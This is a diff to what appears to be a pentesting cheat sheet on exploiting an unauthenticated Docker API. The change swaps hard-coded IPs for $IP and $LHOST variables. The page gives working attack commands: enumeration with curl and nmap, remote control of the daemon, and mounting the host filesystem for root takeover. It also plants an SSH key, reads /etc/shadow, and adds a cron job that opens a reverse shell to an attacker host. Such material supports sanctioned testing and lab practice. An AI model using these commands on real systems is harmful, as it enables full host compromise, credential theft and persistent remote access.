@@ -1,7 +1,7 @@
 # Docker API (2375, 2376)
 
 !!! tip "Start here"
-    Check if the API is unauthenticated: `curl http://10.10.10.10:2375/version`. If it responds, you have full control of the Docker daemon, list containers, pull images, and mount the host filesystem into a new container for a complete host takeover.
+    Check if the API is unauthenticated: `curl http://$IP:2375/version`. If it responds, you have full control of the Docker daemon, list containers, pull images, and mount the host filesystem into a new container for a complete host takeover.
 
 !!! warning "Watch out"
     Port 2375 is unencrypted (no TLS). Port 2376 uses TLS but may still lack client cert verification. Try both.
@@ -11,9 +11,9 @@
 ## Enumeration
 
 ```bash
-nmap -p 2375,2376 10.10.10.10
-curl http://10.10.10.10:2375/version
-curl http://10.10.10.10:2375/containers/json
+nmap -p 2375,2376 $IP
+curl http://$IP:2375/version
+curl http://$IP:2375/containers/json
 ```
 
 ---
@@ -23,7 +23,7 @@ curl http://10.10.10.10:2375/containers/json
 Point your local Docker client at the remote daemon:
 
 ```bash
-export DOCKER_HOST=tcp://10.10.10.10:2375
+export DOCKER_HOST=tcp://$IP:2375
 docker version
 docker ps
 docker images
@@ -36,7 +36,7 @@ docker images
 Mount the host root filesystem into a privileged container:
 
 ```bash
-docker -H tcp://10.10.10.10:2375 run -it --rm \
+docker -H tcp://$IP:2375 run -it --rm \
   -v /:/mnt/host \
   alpine chroot /mnt/host sh
 ```
@@ -51,7 +51,7 @@ echo '<your-public-key>' >> /root/.ssh/authorized_keys
 cat /etc/shadow
 
 # Write a cron job
-echo '* * * * * root bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1' >> /etc/crontab
+echo '* * * * * root bash -i >& /dev/tcp/$LHOST/9001 0>&1' >> /etc/crontab
 ```
 
 ---
@@ -76,9 +76,9 @@ chroot /mnt/host
 ## List and Inspect Running Containers
 
 ```bash
-docker -H tcp://10.10.10.10:2375 ps -a
-docker -H tcp://10.10.10.10:2375 inspect <container-id>
-docker -H tcp://10.10.10.10:2375 exec -it <container-id> sh
+docker -H tcp://$IP:2375 ps -a
+docker -H tcp://$IP:2375 inspect <container-id>
+docker -H tcp://$IP:2375 exec -it <container-id> sh
 ```
 
 !!! tip "Real-world"
